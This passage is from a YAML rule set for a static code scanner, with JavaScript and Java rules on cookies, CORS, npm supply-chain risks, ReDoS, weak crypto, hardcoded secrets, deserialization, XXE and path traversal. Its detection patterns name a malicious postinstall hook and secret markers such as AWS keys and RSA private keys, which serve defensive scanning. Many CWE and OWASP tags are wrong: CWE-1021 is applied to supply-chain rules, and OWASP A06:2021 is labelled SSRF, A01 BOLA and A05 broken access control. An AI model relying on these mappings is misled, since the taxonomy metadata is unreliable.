message: 'CWE-614: Cookie without HttpOnly is accessible to JavaScript via XSS'
tags:
- security
- cookies
- CWE-614
- OWASP-A05:2021-BROKEN-AC
rule:
  kind: CallExpression
  pattern: res.cookie(name, value, {})
note: 'Without HttpOnly, cookies are accessible via JavaScript (document.cookie),
  making them vulnerable to XSS-based theft.


  Remediation:

  - Set httpOnly: true for all session and authentication cookies

  - Only omit for cookies that genuinely need JavaScript access

  - Use Secure flag as well for HTTPS

  - Set SameSite attribute

  '
---
id: javascript-cwe-614-cookie-without-secure
language: javascript
severity: warning
message: 'CWE-614: Cookie without Secure flag is sent over HTTP'
tags:
- security
- cookies
- CWE-614
- OWASP-A02:2021-CM
rule:
  kind: CallExpression
  pattern: res.cookie(name, value, {})
note: 'Without Secure flag, cookies are sent over HTTP, allowing interception via
  man-in-the-middle attacks.


  Remediation:

  - Set secure: true for all cookies in production

  - Use HTTPS everywhere

  - Configure secure flag based on environment

  - Use HSTS to force HTTPS

  '
---
id: javascript-cwe-352-cookie-without-samesite
language: javascript
severity: warning
message: 'CWE-352: Cookie without SameSite is vulnerable to CSRF attacks'
tags:
- security
- cookies
- csrf
- CWE-352
- OWASP-A01:2021-BOLA
rule:
  kind: CallExpression
  pattern: res.cookie(name, value, {})
note: 'Without SameSite, cookies are sent with cross-site requests, enabling CSRF
  attacks. Modern browsers default to Lax.


  Remediation:

  - Set sameSite: ''Strict'' or sameSite: ''Lax'' for session cookies

  - Only use ''None'' with secure: true for legitimate cross-site needs

  - Validate Same-Site enforcement in tests

  - Implement additional CSRF protection

  '
---
id: javascript-cwe-798-sensitive-data-in-cookies
language: javascript
severity: error
message: 'CWE-798: Storing sensitive data in cookies exposes it to XSS and network'
tags:
- security
- cookies
- secrets
- CWE-798
- OWASP-A02:2021-CM
rule:
  kind: CallExpression
  pattern: res.cookie('password', ...)
note: 'Storing sensitive data like passwords in cookies exposes them to theft via
  XSS or network interception.


  Remediation:

  - Store only session identifiers in cookies

  - Keep sensitive data server-side

  - Use encrypted/signed cookies for sensitive non-secret data

  - Use httpOnly and Secure flags

  - Implement session validation

  '
---
id: javascript-cwe-942-cors-allow-all-origins
language: javascript
severity: warning
message: 'CWE-942: CORS allow all origins exposes API to malicious sites'
tags:
- security
- cors
- CWE-942
- OWASP-A01:2021-BOLA
rule:
  kind: Literal
  pattern: 'Access-Control-Allow-Origin: *'
note: 'Allowing all origins enables any website to make requests to your API, potentially
  exposing data to malicious sites.


  Remediation:

  - Specify allowed origins explicitly

  - Use environment-based configuration for different deployments

  - Validate Origin header

  - Use specific domain names, not wildcards

  - Implement credentials handling carefully

  '
---
id: javascript-cwe-942-cors-origin-reflection
language: javascript
severity: error
message: 'CWE-942: CORS origin reflection bypasses CORS protection'
tags:
- security
- cors
- CWE-942
- OWASP-A01:2021-BOLA
rule:
  kind: CallExpression
  pattern: res.setHeader('Access-Control-Allow-Origin', req.headers.origin)
note: 'Reflecting the Origin header allows any domain to access the API, essentially
  bypassing CORS protection.


  Remediation:

  - Validate Origin against allowlist before reflecting

  - Reject requests from unknown origins

  - Maintain strict origin allowlist

  - Log rejected origins for monitoring

  - Use CORS library with proper validation

  '
---
id: javascript-cwe-942-cors-credentials-weak-origin
language: javascript
severity: error
message: 'CWE-942: CORS credentials with weak origin allows authenticated request
  hijacking'
tags:
- security
- cors
- authentication
- CWE-942
- OWASP-A01:2021-BOLA
rule:
  kind: Literal
  pattern: 'Access-Control-Allow-Credentials: true'
note: 'Allowing credentials with weak origin validation enables attackers to perform
  authenticated requests on behalf of users.


  Remediation:

  - With credentials, origins must be explicitly validated

  - Never use * with credentials

  - Maintain strict origin allowlist

  - Always set Secure flag on cookies

  - Implement additional origin validation

  '
---
id: javascript-cwe-942-cors-null-origin-allowed
language: javascript
severity: warning
message: 'CWE-942: CORS null origin allowed can be exploited by local files'
tags:
- security
- cors
- CWE-942
- OWASP-A01:2021-BOLA
rule:
  kind: Literal
  pattern: 'Access-Control-Allow-Origin: null'
note: 'The null origin can be triggered by sandboxed iframes and local files, potentially
  allowing unauthorized access.


  Remediation:

  - Never allow null as an accepted origin

  - Validate against specific domain allowlist only

  - Be aware of null origin from sandboxed iframes

  - Use explicit origin validation

  '
---
id: javascript-cwe-1021-typosquatting-vulnerable-dependencies
language: javascript
severity: error
message: 'CWE-1021: Typosquatting packages can execute malicious code'
tags:
- security
- supply-chain
- npm
- CWE-1021
- OWASP-A08:2021-SCI
rule:
  kind: Literal
  pattern: crossenv
note: 'Attackers publish malicious packages with names similar to popular ones, hoping
  developers will mistype the package name.


  Remediation:

  - Verify package names carefully

  - Use npm audit to check for known vulnerabilities

  - Check download counts and publish dates

  - Use lockfiles to ensure consistent versions

  - Review recent commits before installing

  '
---
id: javascript-cwe-1021-unscoped-private-package-names
language: javascript
severity: error
message: 'CWE-1021: Unscoped package names vulnerable to dependency confusion'
tags:
- security
- supply-chain
- npm
- CWE-1021
- OWASP-A08:2021-SCI
rule:
  kind: Literal
  pattern: package-name
note: 'Dependency confusion attacks exploit unscoped package names by publishing malicious
  public packages with the same name.


  Remediation:

  - Use scoped packages (@yourorg/package)

  - Configure npm to use private registry for your scope

  - Publish private packages to private registry only

  - Use .npmrc to configure registry per scope

  - Audit dependencies for scope mismatches

  '
---
id: javascript-cwe-1021-npm-postinstall-scripts
language: javascript
severity: error
message: 'CWE-1021: npm postinstall scripts run automatically during install'
tags:
- security
- supply-chain
- npm
- CWE-1021
- OWASP-A08:2021-SCI
rule:
  kind: Literal
  pattern: '"postinstall": "node malicious.js"'
note: 'Postinstall scripts run automatically during npm install, allowing immediate
  code execution from malicious packages.


  Remediation:

  - Use --ignore-scripts flag during installation

  - Review new dependencies before installation

  - Use npm audit and security tools

  - Monitor node_modules changes

  - Use dependency lock files

  '
---
id: javascript-cwe-1021-unpinned-dependencies
language: javascript
severity: warning
message: 'CWE-1021: Unpinned dependencies can upgrade to compromised versions'
tags:
- security
- supply-chain
- npm
- CWE-1021
- OWASP-A08:2021-SCI
rule:
  kind: Literal
  pattern: '"lodash": "*"'
note: 'Unpinned dependencies can unexpectedly upgrade to compromised versions. Always
  use lockfiles and review updates.


  Remediation:

  - Use exact versions or lockfiles (package-lock.json)

  - Enable Dependabot or Renovate for controlled updates

  - Review changelogs before updates

  - Test updates in CI/CD before deploying

  - Maintain dependency audit log

  '
---
id: javascript-cwe-1333-regex-catastrophic-backtracking
language: javascript
severity: error
message: 'CWE-1333: Regex with nested quantifiers causes ReDoS'
tags:
- security
- redos
- CWE-1333
- OWASP-A05:2021-BROKEN-AC
rule:
  kind: RegExpLiteral
  pattern: (a+)+
note: 'ReDoS attacks exploit regex patterns that cause exponential backtracking, blocking
  the event loop and causing DoS.


  Remediation:

  - Avoid nested quantifiers (a+)+, (a*)*, (a|a)*

  - Use atomic groups where available

  - Limit input length before matching

  - Use timeout mechanisms

  - Test regex with tools like safe-regex

  - Consider using parsing libraries instead of regex

  '
---
id: javascript-cwe-1333-user-provided-regex
language: javascript
severity: error
message: 'CWE-1333: User-provided regex enables ReDoS attacks'
tags:
- security
- redos
- CWE-1333
- OWASP-A03:2021-Injection
rule:
  kind: NewExpression
  pattern: new RegExp(userInput)
note: 'Allowing users to provide regex patterns enables ReDoS attacks with malicious
  patterns.


  Remediation:

  - Never allow user-provided regex

  - Use fixed patterns or escape user input

  - Implement regex validation for safety

  - Use strict input length limits

  - Test user patterns in sandbox before execution

  '
---
id: javascript-cwe-1333-string-match-complex-regex
language: javascript
severity: warning
message: 'CWE-1333: Complex regex with long input can cause excessive backtracking'
tags:
- security
- redos
- CWE-1333
- OWASP-A05:2021-BROKEN-AC
rule:
  kind: CallExpression
  pattern: userInput.match(complexRegex)
note: 'Even safe-looking regex can be exploited with crafted input strings to cause
  excessive backtracking.


  Remediation:

  - Limit input length before regex matching

  - Use streaming parsers for large inputs

  - Consider using parsing libraries instead of regex

  - Add regex execution timeout

  - Test regex performance with long inputs

  '
---
id: javascript-cwe-1333-regex-without-anchor
language: javascript
severity: info
message: 'CWE-1333: Unanchored regex may only match part of input'
tags:
- security
- redos
- CWE-1333
- OWASP-A05:2021-BROKEN-AC
rule:
  kind: RegExpLiteral
  pattern: /pattern/
note: 'Unanchored patterns may only match part of the input, potentially bypassing
  validation or causing performance issues.


  Remediation:

  - Use ^ at start and $ at end for full string matching

  - Use .test() with proper anchors for validation

  - Use ^ for beginning-of-string assertion

  - Use $ for end-of-string assertion

  - Use multi-line flag carefully

  '
---
id: javascript-cwe-338-math-random-for-security
language: javascript
severity: error
message: 'CWE-338: Math.random() is not cryptographically secure'
tags:
- security
- cryptography
- CWE-338
- OWASP-A02:2021-CM
rule:
  kind: CallExpression
  pattern: Math.random()
note: 'Math.random() is not cryptographically secure. Its output can be predicted,
  compromising security.


  Remediation:

  - Use crypto.randomBytes() in Node.js

  - Use crypto.getRandomValues() in browsers

  - Use SecureRandom in Java

  - Never use Math.random for tokens or passwords

  - Generate sufficient entropy (128+ bits)

  '
---
id: javascript-cwe-327-weak-hash-algorithm
language: javascript
severity: error
message: 'CWE-327: MD5 and SHA1 are cryptographically broken'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:2021-CM
rule:
  kind: CallExpression
  pattern: crypto.createHash('md5')
note: 'MD5 and SHA1 are cryptographically broken. They should not be used for security
  purposes.


  Remediation:

  - Use sha256 or sha512 for general hashing

  - Use bcrypt, scrypt, or Argon2 for password hashing

  - Use HMAC with SHA256+ for message authentication

  - Never use MD5 or SHA1 for security

  - Consider using libsodium for crypto operations

  '
---
id: javascript-cwe-321-hardcoded-encryption-key
language: javascript
severity: error
message: 'CWE-321: Hardcoded encryption key compromises all encrypted data'
tags:
- security
- cryptography
- secrets
- CWE-321
- OWASP-A02:2021-CM
rule:
  kind: CallExpression
  pattern: 'crypto.createCipheriv(''aes-256-cbc'', ''hardcodedKey'', iv)

    '
note: 'Hardcoded encryption keys can be extracted from source code, compromising all
  encrypted data.


  Remediation:

  - Use environment variables or key management services

  - Generate keys securely and store them safely

  - Use AWS KMS, Azure Key Vault, or similar

  - Rotate keys periodically

  - Never commit keys to version control

  '
---
id: javascript-cwe-327-ecb-mode-encryption
language: javascript
severity: error
message: 'CWE-327: ECB mode encryption leaks patterns in plaintext'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:2021-CM
rule:
  kind: CallExpression
  pattern: crypto.createCipheriv('aes-256-ecb', ...)
note: 'ECB mode encrypts identical plaintext blocks to identical ciphertext, leaking
  patterns in the data.


  Remediation:

  - Use authenticated encryption modes like GCM or CBC with HMAC

  - Prefer aes-256-gcm

  - Use AES-GCM for confidentiality and authenticity

  - Add random IV to each encryption

  - Use libsodium or similar for crypto

  '
---
id: javascript-cwe-327-static-iv-for-encryption
language: javascript
severity: error
message: 'CWE-327: Reusing IV makes encryption vulnerable to attacks'
tags:
- security
- cryptography
- CWE-327
- OWASP-A02:2021-CM
rule:
  kind: CallExpression
  pattern: 'crypto.createCipheriv(''aes-256-cbc'', key, ''staticIV'')

    '
note: 'Reusing initialization vectors makes encryption vulnerable to various attacks
  and can reveal patterns.


  Remediation:

  - Generate random IV for each encryption operation: crypto.randomBytes(16)

  - Store IV with ciphertext (IV doesn''t need to be secret)

  - Use crypto library''s random IV generation

  - Never reuse IV with same key

  - Validate IV length and randomness

  '
---
id: javascript-cwe-532-password-in-console-log
language: javascript
severity: error
message: 'CWE-532: Logging passwords exposes sensitive data'
tags:
- security
- logging
- secrets
- CWE-532
- OWASP-A09:2021-LDI
rule:
  kind: CallExpression
  pattern: console.log(password)
note: 'Logging sensitive data exposes it in log files, monitoring systems, and potentially
  to unauthorized personnel.


  Remediation:

  - Never log passwords or sensitive data

  - Sanitize objects before logging

  - Use structured logging with field redaction

  - Implement logging filters for sensitive patterns

  - Review logs for accidental secret exposure

  '
---
id: javascript-cwe-798-api-key-in-source-code
language: javascript
severity: error
message: 'CWE-798: Hardcoded API keys are exposed in code and repositories'
tags:
- security
- secrets
- CWE-798
- OWASP-A02:2021-CM
rule:
  kind: Literal
  pattern: apiKey = "sk_live_..."
note: 'Hardcoded API keys are exposed in version control, compiled code, and potentially
  to unauthorized users.


  Remediation:

  - Use environment variables

  - Use secret management services

  - Never commit secrets to repositories

  - Use .gitignore and .env files

  - Implement secret scanning in CI/CD

  '
---
id: javascript-cwe-798-aws-credentials-in-code
language: javascript
severity: error
message: 'CWE-798: AWS credentials in code enable cloud resource access'
tags:
- security
- secrets
- cloud
- CWE-798
- OWASP-A02:2021-CM
rule:
  kind: Literal
  pattern: AWS_ACCESS_KEY_ID
note: 'AWS credentials in code can be extracted and used to access cloud resources,
  potentially causing massive damage.


  Remediation:

  - Use IAM roles, instance profiles, or environment variables

  - Use AWS Secrets Manager or Parameter Store

  - Use cross-account roles for access

  - Enable MFA for sensitive operations

  - Audit CloudTrail for unusual activity

  '
---
id: javascript-cwe-321-private-key-in-code
language: javascript
severity: error
message: 'CWE-321: Private keys in code can impersonate services and decrypt data'
tags:
- security
- secrets
- cryptography
- CWE-321
- OWASP-A02:2021-CM
rule:
  kind: Literal
  pattern: BEGIN RSA PRIVATE KEY
note: 'Private keys in source code can be used to impersonate services, decrypt data,
  or forge signatures.


  Remediation:

  - Store private keys in secure key stores or HSMs

  - Load keys from files with proper permissions

  - Never commit to version control

  - Use environment variables for key paths

  - Implement key rotation

  '
---
id: javascript-cwe-798-connection-string-with-password
language: javascript
severity: error
message: 'CWE-798: Connection strings with passwords expose database access'
tags:
- security
- secrets
- database
- CWE-798
- OWASP-A02:2021-CM
rule:
  kind: Literal
  pattern: mongodb://user:password@host
note: 'Database connection strings with embedded credentials expose database access
  to anyone with code access.


  Remediation:

  - Use environment variables for connection strings

  - Use secret management services

  - Prefer IAM authentication where available

  - Implement connection pooling with credential management

  - Audit database access logs

  '
---
id: javascript-cwe-209-sensitive-data-in-error-message
language: javascript
severity: warning
message: 'CWE-209: Stack traces expose sensitive information'
tags:
- security
- information-disclosure
- CWE-209
- OWASP-A09:2021-LDI
rule:
  kind: CallExpression
  pattern: res.status(500).send(err)
note: 'Stack traces and detailed error messages can expose sensitive information,
  internal paths, and system details.


  Remediation:

  - Use generic error messages for users

  - Log detailed errors server-side only

  - Implement proper error handling middleware

  - Strip stack traces before sending to client

  - Use error tracking service (Sentry, etc.)

  '
---
id: javascript-cwe-119-buffer-noassert
language: javascript
severity: warning
message: 'CWE-119: Buffer.noAssert bypasses bounds checking'
tags:
- security
- buffer-overflow
- CWE-119
- OWASP-A06:2021-SSRF
rule:
  kind: CallExpression
  pattern: buffer.readUInt32LE(offset, true)
note: 'Using noAssert bypasses bounds checking, potentially causing crashes or memory
  corruption.


  Remediation:

  - Remove the noAssert parameter

  - Let Node.js perform proper bounds checking

  - Validate buffer size before operations

  - Use safe buffer utilities

  '
---
id: javascript-cwe-79-mustache-escape-disabled
language: javascript
severity: error
message: 'CWE-79: Disabling template escaping allows XSS attacks'
tags:
- security
- xss
- templating
- CWE-79
- OWASP-A03:2021-Injection
rule:
  kind: Property
  pattern: escapeMarkup = false
note: 'Disabling template escaping allows XSS attacks through template variables.


  Remediation:

  - Keep escaping enabled

  - Use explicit unescaping only for trusted, sanitized content

  - Validate template input

  - Use modern templating engines with safe defaults

  - Implement Content Security Policy

  '
---
id: javascript-cwe-1008-object-injection-via-constructor
language: javascript
severity: warning
message: 'CWE-1008: Accessing constructor property enables prototype pollution'
tags:
- security
- prototype-pollution
- CWE-1008
- OWASP-A06:2021-SSRF
rule:
  kind: MemberExpression
  pattern: object[userInput]
note: 'Accessing constructor.prototype allows prototype pollution similar to __proto__.


  Remediation:

  - Blocklist constructor, prototype, and __proto__

  - Use Object.hasOwn() to check properties

  - Validate property names against allowlist

  - Use Map for user-provided keys

  - Implement strict property validation

  '
---
id: javascript-cwe-502-unsafe-deserialization
language: javascript
severity: error
message: 'CWE-502: Unsafe deserialization executes arbitrary code'
tags:
- security
- deserialization
- CWE-502
- OWASP-A04:2021-Insecure-Deserialization
rule:
  kind: CallExpression
  pattern: unserialize(userInput)
note: 'Unsafe deserialization can execute arbitrary code when processing malicious
  serialized objects.


  Remediation:

  - Use safe serialization formats like JSON

  - If using node-serialize, never deserialize untrusted input

  - Use JSON.parse with reviver function

  - Validate deserialized objects

  - Use schemas to validate structure

  '
---
id: javascript-cwe-295-tls-certificate-validation-disabled
language: javascript
severity: error
message: 'CWE-295: Disabling TLS certificate validation enables MITM attacks'
tags:
- security
- tls
- network
- CWE-295
- OWASP-A02:2021-CM
rule:
  kind: Property
  pattern: 'rejectUnauthorized: false'
note: 'Disabling TLS certificate validation allows man-in-the-middle attacks.


  Remediation:

  - Keep certificate validation enabled

  - Use proper CA certificates

  - Fix certificate issues rather than bypassing validation

  - Update certificate bundles regularly

  - Use certificate pinning for critical connections

  '
---
id: java-cwe-89-sql-injection-string-format
language: java
severity: error
message: 'CWE-89: SQL Injection via String.format - Using String.format() to build
  SQL queries bypasses prepared statement protection'
tags:
- security
- injection
- CWE-89
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: String.format($FORMAT, ...)
note: 'Never use String.format, MessageFormat.format for SQL queries.

  Use parameterized queries with PreparedStatement instead.

  '
---
id: java-cwe-90-ldap-injection
language: java
severity: error
message: 'CWE-90: LDAP Injection - User input directly in LDAP search filters allows
  injection attacks'
tags:
- security
- injection
- CWE-90
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: $CTX.search($BASE, $FILTER, ...)
note: 'Sanitize LDAP filter input using LdapEncoder.filterEncode() or use JNDI search
  with proper escaping.

  Fix: String safeFilter = "(uid=" + LdapEncoder.filterEncode(username) + ")";

  '
---
id: java-cwe-643-xpath-injection
language: java
severity: warning
message: 'CWE-643: XPath Injection - User input in XPath expressions allows query
  manipulation'
tags:
- security
- injection
- CWE-643
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: $XPATH.evaluate($EXPR, ...)
note: 'Use XPath variables or parameterized expressions instead of string concatenation.

  Avoid dynamic XPath string construction with user input.

  '
---
id: java-cwe-78-command-injection-runtime-exec
language: java
severity: error
message: 'CWE-78: Command Injection via Runtime.exec - Passing user input to Runtime.exec()
  allows command injection'
tags:
- security
- injection
- CWE-78
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: Runtime.getRuntime().exec($CMD)
note: 'Never pass user input to Runtime.exec(). Use ProcessBuilder with array form.

  Fix: ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", validatedHost);

  Process p = pb.start();

  '
---
id: java-cwe-78-command-injection-processbuilder
language: java
severity: error
message: 'CWE-78: Command Injection via ProcessBuilder - User input in ProcessBuilder
  commands allows injection'
tags:
- security
- injection
- CWE-78
- OWASP-A03-2021
rule:
  kind: constructor_invocation
  pattern: new ProcessBuilder(...)
note: 'Avoid passing user input to ProcessBuilder, especially with "sh -c" or "cmd
  /c" shell invocation.

  Pass command as separate array elements and validate all arguments.

  '
---
id: java-cwe-917-ognl-injection
language: java
severity: error
message: 'CWE-917: OGNL Injection - User input in OGNL expressions leads to RCE (Struts
  vulnerabilities)'
tags:
- security
- injection
- CWE-917
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: Ognl.getValue($EXPR, ...)
note: 'Avoid OGNL with user input. Use sandboxed evaluation context if necessary.

  Consider replacing OGNL with safer alternatives.

  '
---
id: java-cwe-917-el-injection
language: java
severity: warning
message: 'CWE-917: EL Injection - User input in JSP/JSF Expression Language can execute
  code'
tags:
- security
- injection
- CWE-917
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: $FACTORY.createValueExpression($CTX, $EXPR, ...)
note: 'Never allow user input in EL expressions.

  Prevent direct string concatenation of user input into expression strings.

  '
---
id: java-cwe-1336-template-injection-freemarker
language: java
severity: error
message: 'CWE-1336: Template Injection (FreeMarker) - User input in FreeMarker templates
  leads to SSTI'
tags:
- security
- injection
- CWE-1336
- OWASP-A03-2021
rule:
  kind: constructor_invocation
  pattern: new Template($NAME, $SOURCE, ...)
note: 'Never allow user input in template content.

  Use data model only; keep template structure in source code.

  '
---
id: java-cwe-1336-template-injection-velocity
language: java
severity: error
message: 'CWE-1336: Template Injection (Velocity) - User input in Velocity templates
  allows code execution'
tags:
- security
- injection
- CWE-1336
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: Velocity.evaluate($CTX, $WRITER, $TAG, $TEMPLATE)
note: 'Do not allow user input in template content.

  Pass data through context model instead.

  '
---
id: java-cwe-1336-template-injection-thymeleaf
language: java
severity: error
message: 'CWE-1336: Template Injection (Thymeleaf) - Dynamic Thymeleaf template names
  or content from user input'
tags:
- security
- injection
- CWE-1336
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: $ENGINE.process($TEMPLATE, ...)
note: 'Use fixed template names; never construct template names from user input.

  Pass user data through context instead.

  '
---
id: java-cwe-502-unsafe-deserialization-objectinputstream
language: java
severity: error
message: 'CWE-502: Unsafe Deserialization with ObjectInputStream - Deserializing untrusted
  data leads to RCE via gadget chains'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08-2021
rule:
  kind: method_invocation
  pattern: ObjectInputStream($STREAM).readObject()
note: 'Use ObjectInputFilter (Java 9+) to whitelist allowed classes.

  Prefer JSON or other safe alternatives to Java serialization.

  Fix: ois.setObjectInputFilter(filterInfo -> {...});

  '
---
id: java-cwe-502-unsafe-deserialization-xmldecoder
language: java
severity: error
message: 'CWE-502: Unsafe XMLDecoder Deserialization - XMLDecoder can execute arbitrary
  code during deserialization'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08-2021
rule:
  kind: constructor_invocation
  pattern: new XMLDecoder($STREAM)
note: 'Avoid XMLDecoder entirely due to inherent security risks.

  Use JAXB or other safe XML parsers instead.

  '
---
id: java-cwe-502-unsafe-deserialization-xstream
language: java
severity: error
message: 'CWE-502: Unsafe XStream Deserialization - XStream without type restrictions
  allows RCE'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08-2021
rule:
  kind: method_invocation
  pattern: $XSTREAM.fromXML($INPUT)
note: 'Configure type restrictions before deserializing.

  Fix: xstream.addPermission(NoTypePermission.NONE);

  xstream.addPermission(new ExplicitTypePermission(new Class[]{SafeClass.class}));

  '
---
id: java-cwe-502-unsafe-deserialization-snakeyaml
language: java
severity: error
message: 'CWE-502: Unsafe SnakeYAML Deserialization - SnakeYAML can instantiate arbitrary
  classes via YAML tags'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08-2021
rule:
  kind: method_invocation
  pattern: $YAML.load($INPUT)
note: 'Use SafeConstructor to only load basic types.

  Fix: Yaml yaml = new Yaml(new SafeConstructor());

  '
---
id: java-cwe-502-unsafe-deserialization-jackson
language: java
severity: error
message: 'CWE-502: Unsafe Jackson Polymorphic Deserialization - Jackson with default
  typing enabled allows type confusion attacks'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08-2021
rule:
  kind: method_invocation
  pattern: $MAPPER.enableDefaultTyping()
note: 'Avoid enableDefaultTyping() entirely. Use explicit type handling with PolymorphicTypeValidator.

  Fix: Use activateDefaultTyping with ObjectMapper.DefaultTyping restricted scope.

  '
---
id: java-cwe-502-unsafe-deserialization-kryo
language: java
severity: error
message: 'CWE-502: Unsafe Kryo Deserialization - Kryo without class registration allows
  arbitrary object instantiation'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08-2021
rule:
  kind: method_invocation
  pattern: $KRYO.setRegistrationRequired(false)
note: 'Enable registration requirement and explicitly register only safe classes.

  Fix: kryo.setRegistrationRequired(true);

  kryo.register(SafeClass.class);

  '
---
id: java-cwe-502-unsafe-deserialization-hessian
language: java
severity: error
message: 'CWE-502: Unsafe Hessian Deserialization - Hessian protocol allows arbitrary
  object deserialization'
tags:
- security
- deserialization
- CWE-502
- OWASP-A08-2021
rule:
  kind: method_invocation
  pattern: HessianInput($STREAM).readObject()
note: 'Hessian has inherent security risks. Consider using safer serialization formats.

  If must use, implement strict object filtering.

  '
---
id: java-cwe-611-xxe-documentbuilderfactory
language: java
severity: warning
message: 'CWE-611: XXE via DocumentBuilderFactory - Default XML parsing configuration
  allows XXE attacks'
tags:
- security
- xxe
- CWE-611
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: DocumentBuilderFactory.newInstance()
note: 'Disable DOCTYPE declarations and external entity processing.

  Fix: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl",
  true);

  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);

  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

  '
---
id: java-cwe-611-xxe-saxparserfactory
language: java
severity: warning
message: 'CWE-611: XXE via SAXParserFactory - SAXParser without XXE protections allows
  entity injection'
tags:
- security
- xxe
- CWE-611
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: SAXParserFactory.newInstance()
note: 'Disable DTDs and external entities in SAX parser configuration.

  '
---
id: java-cwe-611-xxe-xmlinputfactory-stax
language: java
severity: warning
message: 'CWE-611: XXE via XMLInputFactory (StAX) - StAX parser without XXE hardening'
tags:
- security
- xxe
- CWE-611
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: XMLInputFactory.newInstance()
note: 'Set SUPPORT_DTD to false and IS_SUPPORTING_EXTERNAL_ENTITIES to false.

  Fix: factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);

  factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);

  '
---
id: java-cwe-611-xxe-transformerfactory
language: java
severity: warning
message: 'CWE-611: XXE via TransformerFactory - XSLT transformers can be exploited
  via XXE'
tags:
- security
- xxe
- CWE-611
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: TransformerFactory.newInstance()
note: 'Set ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_STYLESHEET to empty string.

  Fix: factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");

  '
---
id: java-cwe-611-xxe-schemafactory
language: java
severity: warning
message: 'CWE-611: XXE via SchemaFactory - Schema validation without XXE protection'
tags:
- security
- xxe
- CWE-611
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: SchemaFactory.newInstance($SCHEMA)
note: 'Disable external DTD and schema loading.

  Fix: factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");

  factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

  '
---
id: java-cwe-611-xxe-unmarshaller-jaxb
language: java
severity: warning
message: 'CWE-611: XXE via Unmarshaller (JAXB) - JAXB unmarshalling without XXE protection'
tags:
- security
- xxe
- CWE-611
- OWASP-A05-2021
rule:
  kind: method_invocation
  pattern: $UNMARSHALLER.unmarshal($SOURCE)
note: 'Use pre-configured SAXSource with XXE protections.

  Fix: SAXParserFactory spf = SAXParserFactory.newInstance();

  spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

  XMLReader xmlReader = spf.newSAXParser().getXMLReader();

  SAXSource source = new SAXSource(xmlReader, new InputSource(inputStream));

  unmarshaller.unmarshal(source);

  '
---
id: java-cwe-917-jndi-injection-log4shell
language: java
severity: error
message: 'CWE-917: JNDI Injection (Log4Shell Pattern) - User input in JNDI lookup
  leads to RCE'
tags:
- security
- jndi
- CWE-917
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: $CTX.lookup($NAME)
note: 'Validate lookup names against a whitelist of allowed values.

  Upgrade Log4j to version 2.17.0 or later.

  Set system property: -Dlog4j2.formatMsgNoLookups=true

  '
---
id: java-cwe-917-jndi-injection-spring-ldap
language: java
severity: error
message: 'CWE-917: JNDI Injection via Spring LDAP - Spring LDAP template with user-controlled
  names'
tags:
- security
- jndi
- CWE-917
- OWASP-A03-2021
rule:
  kind: method_invocation
  pattern: $LDAP.lookup($NAME)
note: 'Validate all LDAP lookup names and search filters against whitelist.

  Avoid concatenating user input into filter strings.

  '
---
id: java-cwe-502-rmi-registry-injection
language: java
severity: error
message: 'CWE-502: RMI Registry Injection - RMI lookups to untrusted servers allow
  deserialization attacks'
tags:
- security
- jndi
- CWE-502
- OWASP-A08-2021
rule:
  kind: method_invocation
  pattern: LocateRegistry.getRegistry($HOST, ...)
note: 'Only connect to trusted RMI registries.

  Validate registry hostname against whitelist.

  Use RMI over SSL/TLS when possible.

  '
---
id: java-cwe-22-path-traversal-file-constructor
language: java
severity: warning
message: 'CWE-22: Path Traversal via File Constructor - User input in file paths without
  validation allows directory traversal'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01-2021
rule:
  kind: constructor_invocation
  pattern: new File($PATH)
note: 'Validate file paths against a base directory.

  Fix: Path basePath = Paths.get("/safe/base/directory").toRealPath();

  Path userPath = basePath.resolve(userFilename).normalize();

  if (!userPath.startsWith(basePath)) throw new SecurityException("Path traversal
  attempt");

  '
---
id: java-cwe-22-path-traversal-nio-paths
language: java
severity: warning
message: 'CWE-22: Path Traversal via NIO Paths - Paths.get() with user input without
  canonicalization check'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01-2021
rule:
  kind: method_invocation
  pattern: Paths.get($PATH)
note: 'Always call normalize() and check startsWith() base directory.

  Verify resolved path is within expected directory.

  '
---
id: java-cwe-22-zip-slip-vulnerability
language: java
severity: warning
message: 'CWE-22: Zip Slip Vulnerability - Extracting archive entries without path
  validation'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A01-2021
rule:
  kind: method_invocation
  pattern: $ENTRY.getName()
note: 'Validate archive entry names before extraction.

  Fix: String entryName = entry.getName();

  Path destPath = destDir.resolve(entryName).normalize();

  if (!destPath.startsWith(destDir)) throw new IOException("Zip Slip: " + entryName);

  '
---
id: java-cwe-327-weak-crypto-des
language: java
severity: warning
message: 'CWE-327: Weak Cryptographic Algorithm (DES) - DES is deprecated and cryptographically
  broken'
tags:
- security
- cryptography
- CWE-327
